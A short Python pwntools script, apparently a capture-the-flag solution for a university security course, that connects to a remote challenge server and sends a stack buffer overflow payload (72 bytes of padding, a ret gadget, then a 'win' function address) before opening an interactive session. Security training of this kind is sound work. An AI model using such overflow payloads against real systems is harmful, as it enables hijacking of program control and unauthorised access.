from pwn import *

elf = ELF("chall")

r = remote('cs2107-ctfd-i.comp.nus.edu.sg', 5001)

'''
r.interactive()
'''

r.recvuntil(b"Choice > ") 
r.sendline(b"1")   
r.recvuntil(b"size > ") 
r.sendline(b"32")   
r.recvuntil(b"name > ") 
r.sendline(b"A")   

win = 0x401b85
ret = 0x40101a 

offset = 72
payload = b"_" * offset
payload += p64(ret) + p64(win)

r.recvuntil(b"Choice > ") 
r.sendline(b"2")   
r.recvuntil(b"size > ") 
r.sendline(b"100")   
r.recvuntil(b"name > ") 
r.sendline(payload)   

r.interactive()
